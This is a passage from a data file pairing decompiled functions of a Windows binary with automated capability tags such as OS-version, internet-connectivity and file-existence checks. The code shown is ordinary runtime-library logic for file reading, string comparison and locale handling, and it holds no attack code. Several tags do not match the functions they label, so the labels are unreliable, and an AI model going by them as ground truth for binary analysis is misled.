pcVar8 = arg_ch + 1;\n                var_8h = 0x1;\n                *(*piVar1 + 5 + iVar9) = 10;\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                              (*(*piVar1 + iVar9), pcVar8, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n            if (iVar6 == 0) {\n                iVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar9 == 5) {\n                    puVar7 = fcn.0041a92a();\n                    *puVar7 = 9;\n                    puVar7 = fcn.0041a933();\n                    *puVar7 = 5;\n                }\n                else {\n                    if (iVar9 == 0x6d) {\n                        return 0;\n                    }\n                    fcn.0041a93c(iVar9);\n                }\n                return -1;\n            }\n            if ((*(*piVar1 + 4 + iVar9) & 0x80) == 0) {\n                return var_8h + lpNumberOfBytesRead;\n            }\n            if ((lpNumberOfBytesRead == 0) || (*arg_ch != '\\n')) {\n                puVar2 = *piVar1 + 4 + iVar9;\n                *puVar2 = *puVar2 & 0xfb;\n            }\n            else {\n                puVar2 = *piVar1 + 4 + iVar9;\n                *puVar2 = *puVar2 | 4;\n            }\n            var_8h = arg_ch + var_8h + lpNumberOfBytesRead;\n            nNumberOfBytesToRead = arg_ch;\n            pcVar8 = arg_ch;\n            if (arg_ch < var_8h) {\n                do {\n                    cVar4 = *nNumberOfBytesToRead;\n                    if (cVar4 == '\\x1a') {\n                        if ((*(*piVar1 + 4 + iVar9) & 0x40) == 0) {\n                            puVar2 = *piVar1 + 4 + iVar9;\n                            *puVar2 = *puVar2 | 2;\n                        }\n                        break;\n                    }\n                    if (cVar4 == '\\r') {\n                        if (nNumberOfBytesToRead < var_8h + -1) {\n                            if (nNumberOfBytesToRead[1] == '\\n') {\n                                pcVar5 = nNumberOfBytesToRead + 2;\n                                goto code_r0x00425cad;\n                            }\ncode_r0x00425cc7:\n                            nNumberOfBytesToRead = nNumberOfBytesToRead + 1;\n                            *pcVar8 = '\\r';\n                        }\n                        else {\n                            pcVar5 = nNumberOfBytesToRead + 1;\n                            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                              (*(*piVar1 + iVar9), &lpBuffer, 1, &lpNumberOfBytesRead, 0);\n                            if (((iVar6 == 0) && (iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar6 != 0)) ||\n                               (lpNumberOfBytesRead == 0)) goto code_r0x00425cc7;\n                            if ((*(*piVar1 + 4 + iVar9) & 0x48) == 0) {\n                                if ((pcVar8 == arg_ch) && (lpBuffer == '\\n')) goto code_r0x00425cad;\n                                fcn.00421728(arg_8h, 0xffffffff, 1);\n                                if (lpBuffer == '\\n') goto code_r0x00425ccb;\n                                goto code_r0x00425cc7;\n                            }\n                            if (lpBuffer == '\\n') {\ncode_r0x00425cad:\n                                nNumberOfBytesToRead = pcVar5;\n                                *pcVar8 = '\\n';\n                            }\n                            else {\n                                *pcVar8 = '\\r';\n                                *(*piVar1 + 5 + iVar9) = lpBuffer;\n                                nNumberOfBytesToRead = pcVar5;\n                            }\n                        }\n                        pcVar8 = pcVar8 + 1;\n                        pcVar5 = nNumberOfBytesToRead;\n                    }\n                    else {\n                        *pcVar8 = cVar4;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar5 = nNumberOfBytesToRead + 1;\n                    }\ncode_r0x00425ccb:\n                    nNumberOfBytesToRead = pcVar5;\n                } while (nNumberOfBytesToRead < var_8h);\n            }\n            return pcVar8 - arg_ch;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1323
    },
    "00425dfe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_84h\n\nvoid __cdecl fcn.00425dfe(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint *noname_2;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    char *pcVar5;\n    uint var_84h;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint var_4h;\n    \n    if (arg_8h != 1) {\n        if (arg_8h == 0) {\n            pcVar5 = 0x450c3c;\n            iVar3 = fcn.00426a31(arg_ch, arg_10h, 0x450c3c, 4, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, \n                                 in_stack_ffffff7c, in_stack_ffffff80);\n            if (iVar3 != 0) {\n                *arg_14h = '\\0';\n                do {\n                    cVar1 = *pcVar5;\n                    iVar3 = fcn.004214e0(cVar1);\n                    if (iVar3 == 0) break;\n                    pcVar5 = pcVar5 + 2;\n                    *arg_14h = *arg_14h * '\\n' + cVar1 + -0x30;\n                } while (pcVar5 < 0x450c44);\n            }\n        }\n        goto code_r0x00425eb0;\n    }\n    noname_2 = &var_84h;\n    bVar2 = false;\n    iVar3 = fcn.00426b61(arg_ch, arg_10h, noname_2, 0x80, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, in_stack_ffffff7c\n                         , in_stack_ffffff80);\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (((iVar3 != 0x7a) ||\n            (iVar3 = fcn.00426b61(arg_ch, arg_10h, 0, 0, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, in_stack_ffffff7c\n                                  , in_stack_ffffff80),  iVar3 == 0)) ||\n           (noname_2 = fcn.004188ff(iVar3),  noname_2 == NULL)) goto code_r0x00425eb0;\n        bVar2 = true;\n        iVar3 = fcn.00426b61(arg_ch, arg_10h, noname_2, iVar3, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, \n                             in_stack_ffffff7c, in_stack_ffffff80);\n        if (iVar3 != 0) goto code_r0x00425e91;\n    }\n    else {\ncode_r0x00425e91:\n        iVar4 = fcn.004188ff(iVar3);\n        *arg_14h = iVar4;\n        if (iVar4 != 0) {\n            fcn.00421eb0(iVar4, noname_2, iVar3);\n            if (bVar2) {\n                fcn.00418911(noname_2);\n            }\n            goto code_r0x00425eb0;\n        }\n        if (!bVar2) goto code_r0x00425eb0;\n    }\n    fcn.00418911(noname_2);\ncode_r0x00425eb0:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 860
    },
    "00425f25": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00425f25(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44db2c) {\n        iVar1 = fcn.00420610();\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        iVar2 = fcn.00425db0(arg_8h, arg_ch);\n    }\n    else {\n        do {\n            iVar2 = fcn.00422055(iVar1, *arg_8h);\n            arg_8h = arg_8h + 1;\n            iVar3 = fcn.00422055(iVar1, *arg_ch);\n            arg_ch = arg_ch + 1;\n            if (iVar2 == 0) break;\n        } while (iVar2 == iVar3);\n        iVar2 = iVar2 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 255
    },
    "00425f8e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00425f8e(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44db2c) {\n        iVar1 = fcn.00420610();\n    }\n    if (arg_10h == 0) {\n        iVar2 = 0;\n    }\n    else if (*(iVar1 + 0x14) == 0) {\n        iVar2 = fcn.00426cb0(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        do {\n            iVar2 = fcn.00422055(iVar1, *arg_8h);\n            arg_8h = arg_8h + 1;\n            iVar3 = fcn.00422055(iVar1, *arg_ch);\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n            if ((arg_10h == 0) || (iVar2 == 0)) break;\n        } while (iVar2 == iVar3);\n        iVar2 = iVar2 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 315
    },
    "00426156": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00426156(int32_t param_1)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = param_1;\n    if (param_1 != 0) {\n        do {\n            iVar1 = iVar1 + -1;\n            if (*in_EAX == '\\0') goto code_r0x0042616a;\n            in_EAX = in_EAX + 1;\n        } while (iVar1 != 0);\n    }\n    iVar1 = iVar1 + -1;\ncode_r0x0042616a:\n    return (param_1 - iVar1) + -1;\n}\n",
        "token_count": 143
    },
    "00426172": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_44h_2\n// WARNING: Variable defined which should be unmapped: var_40h_3\n// WARNING: Variable defined which should be unmapped: var_3ch_3\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nvoid __cdecl\nfcn.00426172(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint arg_8h, uint arg_ch, uint lpMultiByteStr, uint cbMultiByte, \n            uint lpString2, uint cchCount2, uint CodePage)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint *arg_8h_00;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    int32_t iVar6;\n    uint Locale;\n    uint dwCmpFlags;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint lpCPInfo;\n    uint var_4h_2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_1ch_2;\n    uint var_20h;\n    uint var_4h;\n    uint var_50h;\n    uint var_44h_2;\n    uint var_40h_3;\n    uint var_3ch_3;\n    uint lpString1;\n    uint var_30h_2;\n    uchar auStack48 [2];\n    uint var_2ah;\n    int32_t var_4ch;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_5ch;\n    uint uVar7;\n    \n    uVar7 = 0x40;\n    fcn.00419d14();\n    *(unaff_EBP + -0x1c) = *0x44d270;\n    iVar6 = 0;\n    if (*0x450c44 == 0) {\n        var_4ch = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CompareStringW)();\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 == 0x78) {\n                *0x450c44 = 2;\n            }\n        }\n        else {\n            *0x450c44 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        uVar3 = fcn.00426156();\n        *(unaff_EBP + 0x14) = uVar3;\n    }\n    iVar2 = *(unaff_EBP + 0x1c);\n    if (0 < iVar2) {\n        iVar2 = fcn.00426156();\n        *(unaff_EBP + 0x1c) = iVar2;\n    }\n    if ((*0x450c44 == 2) || (*0x450c44 == 0)) {\n        *(unaff_EBP + -0x38) = 0;\n        if (*(unaff_EBP + 8) == 0) {\n            *(unaff_EBP + 8) = *0x450b9c;\n        }\n        iVar2 = *(unaff_EBP + 0x20);\n        if (*(unaff_EBP + 0x20) == 0) {\n            iVar2 = *0x450bac;\n        }\n        iVar5 = fcn.004249f9(*(unaff_EBP + 8));\n        if (iVar5 == -1) goto code_r0x004264e5;\n        if (iVar5 != iVar2) {\n            var_4ch = iVar2;\n            iVar6 = fcn.00424a3c(iVar2, iVar5, *(unaff_EBP + 0x10), unaff_EBP + 0x14, 0, 0, 0x443b88, uVar7);\n            if (iVar6 == 0) goto code_r0x004264e5;\n            var_4ch = iVar2;\n            iVar2 = fcn.00424a3c(iVar2, iVar5, *(unaff_EBP + 0x18), unaff_EBP + 0x1c, 0, 0, 0x443b88, uVar7);\n            *(unaff_EBP + -0x38) = iVar2;\n            if (iVar2 == 0) {\n                fcn.00418911(iVar6);\n                goto code_r0x004264e5;\n            }\n            *(unaff_EBP + 0x10) = iVar6;\n            *(unaff_EBP + 0x18) = *(unaff_EBP + -0x38);\n        }\n        var_4ch = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_CompareStringA)();\n        if (iVar6 != 0) {\n            fcn.00418911(iVar6);\n            stack0xffffffd4 = 0x4264e1;\n            fcn.00418911(*(unaff_EBP + -0x38));\n        }\n        goto code_r0x004264e5;\n    }\n    if (*0x450c44 != 1) goto code_r0x004264e5;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x450bac;\n    }\n    if ((*(unaff_EBP + 0x14) == 0) || (iVar2 == 0)) {\n        if ((*(unaff_EBP + 0x14) == iVar2) ||\n           (((1 < iVar2 || (1 < *(unaff_EBP + 0x14))) || (iVar6 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(),  iVar6 == 0))))\n        goto code_r0x004264e5;\n        if (0 < *(unaff_EBP + 0x14)) {\n            if (1 < *(unaff_EBP + -0x30)) {\n                puVar4 = unaff_EBP + -0x2a;\n                uVar1 = *(unaff_EBP + -0x2a);\n                while (((uVar1 != 0 && (puVar4[1] != 0)) &&\n                       ((**(unaff_EBP + 0x10) < *puVar4 || (puVar4[1] < **(unaff_EBP + 0x10)))))) {\n                    puVar4 = puVar4 + 2;\n                    uVar1 = *puVar4;\n                }\n            }\n            goto code_r0x004264e5;\n        }\n        if (0 < *(unaff_EBP + 0x1c)) {\n            if (1 < *(unaff_EBP + -0x30)) {\n                puVar4 = unaff_EBP + -0x2a;\n                uVar1 = *(unaff_EBP + -0x2a);\n                while (((uVar1 != 0 && (puVar4[1] != 0)) &&\n                       ((**(unaff_EBP + 0x18) < *puVar4 || (puVar4[1] < **(unaff_EBP + 0x18)))))) {\n                    puVar4 = puVar4 + 2;\n                    uVar1 = *puVar4;\n                }\n            }\n            goto code_r0x004264e5;\n        }\n    }\n    var_4ch = *(unaff_EBP + 0x20);\n    iVar6 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    *(unaff_EBP + -0x48) = iVar6;\n    if (iVar6 == 0) goto code_r0x004264e5;\n    *(unaff_EBP + -4) = 0;\n    fcn.00418b80();\n    *(unaff_EBP + -0x18) = &fcn.00426172::var_4ch;\n    *(unaff_EBP + -0x34) = &fcn.00426172::var_4ch;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x34) == 0) {\n        iVar2 = fcn.004188ff();\n        *(unaff_EBP + -0x34) = iVar2;\n        if (iVar2 == 0) goto code_r0x004264e5;\n        *(unaff_EBP + -0x3c) = 1;\n    }\n    unique0x00007a00 = *(unaff_EBP + 0x14);\n    _auStack48 = *(unaff_EBP + 0x10);\n    var_30h_2 = 1;\n    lpString1 = *(unaff_EBP + 0x20);\n    iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    if (iVar2 != 0) {\n        arg_8h_00 = &fcn.00426172::lpString1;\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 0x20), 9, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), 0, 0);\n        *(unaff_EBP + -0x4c) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP + -4) = 1;\n            fcn.00418b80();\n            *(unaff_EBP + -0x18) = &fcn.00426172::lpString1;\n            *(unaff_EBP + -0x50) = &fcn.00426172::lpString1;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x38) {\n                arg_8h_00 = fcn.004188ff(iVar2 * 2);\n                if (arg_8h_00 == NULL) goto code_r0x00426420;\n                *(unaff_EBP + -0x44) = 1;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x20), 1, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), arg_8h_00, iVar2);\n            if (iVar5 != 0) {\n                uVar7 = (*_sym.imp.KERNEL32.dll_CompareStringW)\n                                  (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x34), iVar6, arg_8h_00, iVar2);\n                *(unaff_EBP + -0x40) = uVar7;\n            }\n            if (*(unaff_EBP + -0x44) != 0) {\n                fcn.00418911(arg_8h_00);\n            }\n        }\n    }\ncode_r0x00426420:\n    if (*(unaff_EBP + -0x3c) != 0) {\n        fcn.00418911(*(unaff_EBP + -0x34));\n    }\ncode_r0x004264e5:\n    *(unaff_EBP + -0x60) = 0x4264f0;\n    fcn.004192ca();\n    *(unaff_EBP + -0x60) = 0x4264f5;\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 2848
    },
    "00426543": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * fcn.00426543(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar3 = 0;\n    if (unaff_EDI != NULL) {\n        iVar1 = *unaff_EDI;\n        piVar2 = unaff_EDI;\n        while (iVar1 != 0) {\n            piVar2 = piVar2 + 1;\n            iVar3 = iVar3 + 1;\n            iVar1 = *piVar2;\n        }\n        piVar2 = fcn.004188ff(iVar3 * 4 + 4);\n        if (piVar2 == NULL) {\n            fcn.0041907b(9);\n        }\n        iVar3 = *unaff_EDI;\n        piVar4 = piVar2;\n        while (iVar3 != 0) {\n            iVar3 = fcn.00419aaa(iVar3);\n            *piVar4 = iVar3;\n            piVar4 = piVar4 + 1;\n            unaff_EDI = unaff_EDI + 1;\n            iVar3 = *unaff_EDI;\n        }\n        *piVar4 = 0;\n        return piVar2;\n    }\n    return unaff_EDI;\n}\n",
        "token_count": 304
    },
    "00426779": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00426779(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t *piVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    uint16_t uVar8;\n    int32_t var_28h;\n    uint16_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = arg_ch;\n    var_4h = *0x44d270;\n    var_1ch = 0;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0;\n    var_10h._2_2_ = 0;\n    var_ch._0_2_ = 0;\n    var_ch._2_2_ = 0;\n    var_8h._0_2_ = 0;\n    var_8h._2_1_ = 0;\n    var_8h._3_1_ = 0;\n    uVar6 = *(arg_ch + 10) & 0x7fff;\n    uVar4 = *(arg_8h + 10) & 0x7fff;\n    uVar8 = (*(arg_ch + 10) ^ *(arg_8h + 10)) & 0x8000;\n    uVar2 = uVar6 + uVar4;\n    if (((uVar4 < 0x7fff) && (uVar6 < 0x7fff)) && (uVar2 < 0xbffe)) {\n        if (uVar2 < 0x3fc0) {\ncode_r0x00426826:\n            arg_8h[2] = 0;\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            goto code_r0x0042699e;\n        }\n        if (uVar4 == 0) {\n            uVar2 = uVar2 + 1;\n            arg_8h._0_2_ = 0;\n            if ((((arg_8h[2] & 0x7fffffffU) != 0) || (arg_8h[1] != 0)) || (*arg_8h != 0)) goto code_r0x00426810;\n        }\n        else {\ncode_r0x00426810:\n            if (((uVar6 == 0) && (uVar2 = uVar2 + 1,  (arg_ch[2] & 0x7fffffffU) == 0)) &&\n               ((arg_ch[1] == 0 && (*arg_ch == 0)))) goto code_r0x00426826;\n            var_18h = 0;\n            var_14h = &var_ch;\n            arg_ch = 0x5;\n            do {\n                if (0 < arg_ch) {\n                    var_24h = var_18h * 2 + arg_8h;\n                    var_20h = piVar3 + 2;\n                    var_28h = arg_ch;\n                    do {\n                        iVar5 = fcn.004252a6(var_14h[-1], *var_20h * *var_24h, var_14h + -1);\n                        if (iVar5 != 0) {\n                            *var_14h = *var_14h + 1;\n                        }\n                        var_24h = var_24h + 1;\n                        var_20h = var_20h + -2;\n                        var_28h = var_28h + -1;\n                    } while (var_28h != 0);\n                }\n                var_14h = var_14h + 2;\n                var_18h = var_18h + 1;\n                arg_ch = arg_ch + -1;\n            } while (0 < arg_ch);\n            arg_8h._0_2_ = uVar2 + 0xc002;\n            if (arg_8h < 1) {\ncode_r0x004268da:\n                arg_8h._0_2_ = arg_8h - 1;\n                if (arg_8h < 0) {\n                    uVar7 = -arg_8h;\n                    arg_8h._0_2_ = 0;\n                    do {\n                        if ((var_10h & 1) != 0) {\n                            var_1ch = var_1ch + 1;\n                        }\n                        fcn.00425353(&var_10h);\n                        uVar7 = uVar7 - 1;\n                    } while (uVar7 != 0);\n                    if (var_1ch != 0) {\n                        var_10h._0_1_ = var_10h | 1;\n                    }\n                }\n            }\n            else {\n                do {\n                    if ((var_8h._3_1_ & 0x80) != 0) break;\n                    fcn.00425325(&var_10h);\n                    arg_8h._0_2_ = arg_8h - 1;\n                } while (0 < arg_8h);\n                if (arg_8h < 1) goto code_r0x004268da;\n            }\n            if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n               ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                    var_10h._2_2_ = 0;\n                    var_ch._0_2_ = 0;\n                    if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                        var_ch._2_2_ = 0;\n                        var_8h._0_2_ = 0;\n                        if (CONCAT11(var_8h._3_1_, var_8h._2_1_) == -1) {\n                            arg_8h._0_2_ = arg_8h + 1;\n                            var_8h._2_1_ = 0;\n                            var_8h._3_1_ = 0x80;\n                        }\n                        else {\n                            iVar1 = CONCAT11(var_8h._3_1_, var_8h._2_1_) + 1;\n                            var_8h._2_1_ = iVar1;\n                            var_8h._3_1_ = iVar1 >> 8;\n                        }\n                    }\n                    else {\n                        iVar5 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                        var_ch._2_2_ = iVar5;\n                        var_8h._0_2_ = iVar5 >> 0x10;\n                    }\n                }\n                else {\n                    iVar5 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                    var_10h._2_2_ = iVar5;\n                    var_ch._0_2_ = iVar5 >> 0x10;\n                }\n            }\n            if (0x7ffe < arg_8h) goto code_r0x00426983;\n            *arg_8h = var_10h._2_2_;\n            *(arg_8h + 2) = CONCAT22(var_ch._2_2_, var_ch);\n            *(arg_8h + 6) = CONCAT13(var_8h._3_1_, CONCAT12(var_8h._2_1_, var_8h));\n            arg_8h._0_2_ = arg_8h | uVar8;\n        }\n        *(arg_8h + 10) = arg_8h;\n    }\n    else {\ncode_r0x00426983:\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        arg_8h[2] = (-(uVar8 != 0) & 0x80000000) + 0x7fff8000;\n    }\ncode_r0x0042699e:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 1899
    },
    "00426a31": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.00426a31(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint CodePage, uint noname_5, uint arg_8h, \n            uint arg_ch, uint noname_8, uint noname_9, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h_00;\n    int32_t unaff_EBP;\n    uint Locale;\n    uint LCType;\n    uint lpLCData;\n    uint cchData;\n    uint var_34h;\n    uint uVar2;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h_2;\n    uint var_1ch_2;\n    uint uStack24;\n    uint uStack20;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    var_18h = 0x18;\n    var_1ch = 0x443ba0;\n    var_20h = 0x426a3d;\n    fcn.00419d14();\n    if (*0x450c48 == 0) {\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = 1;\n        uStack24 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        if (iVar1 == 0) {\n            var_20h = 0x426a66;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x450c48 = 2;\n            }\n        }\n        else {\n            *0x450c48 = 1;\n        }\n    }\n    if (*0x450c48 == 1) {\n        var_20h = *(unaff_EBP + 0x14);\n        var_24h = *(unaff_EBP + 0x10);\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n    }\n    else if ((*0x450c48 == 2) || (*0x450c48 == 0)) {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x24) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x450bac;\n        }\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        arg_8h_00 = &stack0xffffffe8;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)();\n        *(unaff_EBP + -0x20) = iVar1;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.00418b80();\n            *(unaff_EBP + -0x18) = &stack0xffffffe8;\n            *(unaff_EBP + -0x28) = &stack0xffffffe8;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x18) {\n                arg_8h_00 = fcn.004188ff(*(unaff_EBP + -0x20));\n                if (arg_8h_00 == NULL) goto code_r0x00426b58;\n                *(unaff_EBP + -0x24) = 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_8h_00, *(unaff_EBP + -0x20));\n            if (iVar1 != 0) {\n                if (*(unaff_EBP + 0x14) == 0) {\n                    var_28h = 0;\n                    uVar2 = 0;\n                }\n                else {\n                    var_28h = *(unaff_EBP + 0x14);\n                    uVar2 = *(unaff_EBP + 0x10);\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(unaff_EBP + 0x18), 1, arg_8h_00, 0xffffffff, uVar2, var_28h);\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            if (*(unaff_EBP + -0x24) != 0) {\n                fcn.00418911(arg_8h_00);\n            }\n        }\n    }\ncode_r0x00426b58:\n    *(unaff_EBP + -0x38) = 0x426b60;\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 1249
    },
    "00426b61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
